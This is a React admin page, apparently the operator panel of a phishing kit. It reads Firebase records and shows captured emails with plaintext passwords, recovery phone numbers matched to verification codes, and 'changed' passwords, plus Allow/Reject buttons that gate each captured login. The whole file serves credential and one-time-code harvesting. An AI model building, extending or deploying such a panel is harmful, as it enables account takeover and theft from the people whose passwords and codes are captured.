import React, { useEffect, useState } from "react";
import { database, ref, get, child, update } from "../firebase";
import "./login.css";

const Admin = () => {
  const [logins, setLogins] = useState([]);
  const [recoveries, setRecoveries] = useState([]);
  const [verifications, setVerifications] = useState([]);
  const [newPasswords, setNewPasswords] = useState([]);


  useEffect(() => {
    const fetchData = async () => {
      const dbRef = ref(database);

      // Fetch logins
      const loginsSnap = await get(child(dbRef, "logins"));
      if (loginsSnap.exists()) {
        const data = loginsSnap.val();
        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
        setLogins(formatted);
      }

      // Fetch recoveries
      const recSnap = await get(child(dbRef, "recoveries"));
      if (recSnap.exists()) {
        const data = recSnap.val();
        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
        setRecoveries(formatted);
      }

      // Fetch verifications
      const verSnap = await get(child(dbRef, "verifications"));
      if (verSnap.exists()) {
        const data = verSnap.val();
        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
        setVerifications(formatted);
      }

      // Fetch newPasswords
      const newPassSnap = await get(child(dbRef, "newPasswords"));
      if (newPassSnap.exists()) {
        const data = newPassSnap.val();
        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
        setNewPasswords(formatted);
      }

    };

    fetchData();
  }, []);

  // Create a map phone -> code from verifications
  const phoneToCodeMap = {};
  verifications.forEach(({ phone, code }) => {
    phoneToCodeMap[phone] = code;
  });

  const handleDecision = async (id, status) => {
    await update(ref(database, `logins/${id}`), { status });
    setLogins((prev) =>
      prev.map((entry) => (entry.id === id ? { ...entry, status } : entry))
    );
  };

  const thStyle = {
    borderBottom: "2px solid #ccc",
    padding: "8px",
    background: "#f1f1f1",
    textAlign: "left",
  };

  const tdStyle = {
    borderBottom: "1px solid #eee",
    padding: "8px",
  };

  return (
    <div className="login-container">
      <div className="login-box" style={{ width: "100%", maxWidth: "900px" }}>
        <h2 className="login-title">Admin Panel - Login History</h2>

        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr>
              <th style={thStyle}>Email</th>
              <th style={thStyle}>Password</th>
              <th style={thStyle}>Time</th>
              <th style={thStyle}>Status</th>
              <th style={thStyle}>Action</th>
            </tr>
          </thead>
          <tbody>
            {logins.map((entry) => (
              <tr key={entry.id}>
                <td style={tdStyle}>{entry.email}</td>
                <td style={tdStyle}>{entry.password}</td>
                <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
                <td style={tdStyle}>{entry.status || "Pending"}</td>
                <td style={tdStyle}>
                  <button
                    onClick={() => handleDecision(entry.id, "allowed")}
                    disabled={entry.status === "allowed"}
                    style={{ marginRight: "10px" }}
                  >
                    Allow
                  </button>
                  <button
                    onClick={() => handleDecision(entry.id, "rejected")}
                    disabled={entry.status === "rejected"}
                  >
                    Reject
                  </button>
                </td>
              </tr>
            ))}
          </tbody>
        </table>

        <h2 className="login-title" style={{ marginTop: "40px" }}>
          Recovery Requests
        </h2>

        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr>
              <th style={thStyle}>Email</th>
              <th style={thStyle}>Phone</th>
              <th style={thStyle}>Verification Code</th>
              <th style={thStyle}>Time</th>
            </tr>
          </thead>
          <tbody>
            {recoveries.map((entry) => (
              <tr key={entry.id}>
                <td style={tdStyle}>{entry.email}</td>
                <td style={tdStyle}>{entry.phone}</td>
                <td style={tdStyle}>{phoneToCodeMap[entry.phone] || "-"}</td>
                <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>

        <h2 className="login-title" style={{ marginTop: "40px" }}>
          Changed Passwords
        </h2>

        <table style={{ width: "100%", borderCollapse: "collapse" }}>
          <thead>
            <tr>
              <th style={thStyle}>Email</th>
              <th style={thStyle}>New Password</th>
              <th style={thStyle}>Time</th>
            </tr>
          </thead>
          <tbody>
            {newPasswords.map((entry) => (
              <tr key={entry.id}>
                <td style={tdStyle}>{entry.email}</td>
                <td style={tdStyle}>{entry.password}</td>
                <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
              </tr>
            ))}
          </tbody>
        </table>

      </div>
    </div>
  );
};

export default Admin;
